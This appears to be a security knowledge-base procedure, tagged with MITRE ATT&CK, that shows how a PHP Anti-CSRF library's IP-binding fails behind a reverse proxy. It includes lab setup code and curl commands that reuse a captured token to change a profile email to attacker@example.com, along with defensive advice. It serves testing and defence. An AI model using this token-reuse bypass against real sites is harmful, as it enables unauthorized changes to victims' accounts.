---
id: b2c3d4e5-f6g7-8901-bcde-f23456789012
tags:
  - csrf
  - proxy
  - ip-binding
  - php
  - web-vulnerability
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
commands:
  - '[[commands/curl-generate-token]]'
  - '[[commands/curl-submit-csrf]]'
verified: false
platforms:
  - Web
  - PHP
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[Exploit Public-Facing Application]]'
updated_at: '2025-12-14T17:27:03.275Z'
skill_level: intermediate
impact_level: medium
detection_risk: low
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Initial Access]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
---
# Demonstrate-CSRF-IP-Binding-Failure

## Summary

This procedure tests and demonstrates the flaw in the Anti-CSRF Library where the $hmac_ip feature binds CSRF tokens to the proxy's IP address instead of the client's real IP when deployed behind a reverse proxy, WAF, or load balancer, potentially allowing CSRF attacks by enabling token reuse across different client IPs.

## Description

The Anti-CSRF Library (versions 1.0.0 and 2.0.0) uses $_SERVER['REMOTE_ADDR'] to incorporate the client's IP into the HMAC for token generation when $hmac_ip is enabled. In proxied environments, this captures the proxy's IP, not the real client IP, as no X-Forwarded-For header is checked (and such headers are spoofable). This renders the IP-binding ineffective, undermining CSRF protection if relied upon. Maintainers recommend disabling this feature due to issues with mobile and Tor users, favoring HTTPS for security. The procedure involves setting up a test PHP application, generating a token via proxy, and reusing it from another IP to perform an unauthorized action.

## Requirements

1. PHP environment with Anti-CSRF Library installed (v1.0.0 or v2.0.0)
2. Reverse proxy setup (e.g., Nginx or Apache) forwarding requests to the PHP app
3. Access to server logs to verify $_SERVER['REMOTE_ADDR']
4. Ability to simulate requests from different IPs (e.g., via curl with X-Forwarded-For)

## Defense

Defensive measures and detection strategies:

- Disable $hmac_ip feature and rely on HTTPS with SameSite cookies for CSRF protection
- Implement proper client IP detection using trusted X-Forwarded-For from known proxies
- Monitor for anomalous form submissions or token reuse in logs
- Use comprehensive CSRF tokens without IP binding and validate on server-side

## Objectives

1. Verify that CSRF tokens are bound to proxy IP, not client IP
2. Demonstrate successful CSRF attack using the same token from a different IP
3. Highlight the need to avoid IP-binding in proxied setups

## Instructions

### Step 1: Setup Vulnerable Application

**Context**: Deploy a simple PHP app using the Anti-CSRF Library with IP-binding enabled behind a proxy to simulate a real-world setup.

Configure Nginx as reverse proxy:

```nginx
server {
    listen 80;
    location / {
        proxy_pass http://localhost:8080;
        proxy_set_header X-Forwarded-For $remote_addr;
    }
}
```

In PHP (generate-token.php):

```php
<?php
require_once 'anti-csrf.php';
$token = anti_csrf_generate('update_profile', true); // Enable IP binding
$_SESSION['csrf_token'] = $token;
echo $token;
// Log REMOTE_ADDR for verification
error_log('REMOTE_ADDR: ' . $_SERVER['REMOTE_ADDR']);
?>
```

Start the PHP server on port 8080 and Nginx on 80.

### Step 2: Generate Token via Proxy

**Context**: Simulate a client request through the proxy to generate a token bound to the proxy's IP.

**Command** ([[commands/curl-generate-token]]):

```bash
curl -H "X-Forwarded-For: 192.168.1.100" http://localhost/generate-token.php
```

> This outputs the CSRF token and logs the proxy's IP (e.g., 127.0.0.1) as REMOTE_ADDR. Capture the token value for reuse.

### Step 3: Reuse Token from Different IP

**Context**: Submit a state-changing request using the same token but from a different simulated client IP to bypass the intended IP restriction.

**Command** ([[commands/curl-submit-csrf]]):

```bash
TOKEN="captured_token_here"
curl -H "X-Forwarded-For: 10.0.0.50" -X POST http://localhost/update-profile.php -d "csrf_token=$TOKEN&action=update_email&new_email=attacker@example.com"
```

In update-profile.php:

```php
<?php
require_once 'anti-csrf.php';
if (anti_csrf_check('update_profile', $_POST['csrf_token'], true)) {
    // Perform update (vulnerable to bypass)
    echo "Update successful";
} else {
    echo "CSRF failure";
}
?>
```

> The update succeeds because the token HMAC matches the proxy IP, not the new client IP, confirming the bypass.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]

### Techniques

- [[Exploit Public-Facing Application]]

### Sub-Techniques


## Commands Used

- [[commands/curl-generate-token]]
- [[commands/curl-submit-csrf]]

## Tools Used


## Tags

- [[csrf]]
- [[proxy]]
- [[ip-binding]]
- [[php]]
- [[web-vulnerability]]
